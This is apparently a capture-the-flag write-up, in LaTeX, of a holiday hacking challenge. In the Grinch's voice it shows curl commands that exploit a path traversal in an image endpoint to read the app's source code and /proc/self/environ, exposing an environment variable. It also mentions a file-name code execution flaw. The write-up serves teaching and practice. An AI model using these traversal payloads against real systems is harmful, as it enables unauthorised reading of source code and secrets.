\chapter{Objective 8}
Grinch had already eyeballed that machine and knew about boundaries. So this time, he pretended to be Santa. He also had some pictures lying around.

\subsection{Solving the problem}
Grinch initially tried to figure out what's going on with the site. You know, normal stuff.
He uploaded some pics and noticed that he could visit them in the APP/image?id= path. He remembered that hint from the elf about the source code.
He jumped in his favourite terminal.
\begin{minted}{bash}
$ curl https://tag-generator.kringlecastle.com/RandomPathNotExisting # Force error
<h1>Something went wrong!</h1>

<p>Error in /app/lib/app.rb: Route not found</p>
$ # We know where the source is located.
$ curl https://tag-generator.kringlecastle.com/image?id=../../../app/lib/app.rb
# encoding: ASCII-8BIT

TMP_FOLDER = '/tmp'
FINAL_FOLDER = '/tmp'

<snip>

$ # We have the source code.
\end{minted}

Grinch was laughing that he had the source code. Per the source, one could upload zip, png, and jpg images.
Also, there was a code execution vulnerability in the file name. Grinch was experienced enough to test first whether he could
fetch the env variable in some other way. Maybe, the env variable was exposed in the app.

\begin{minted}{bash}
$ curl https://tag-generator.kringlecastle.com/image?id=../../../proc/self/environ --output -
<snip>
GREETZ=JackFrostWasHere
<snip>
\end{minted}

Sure enough, the variable was accessible.
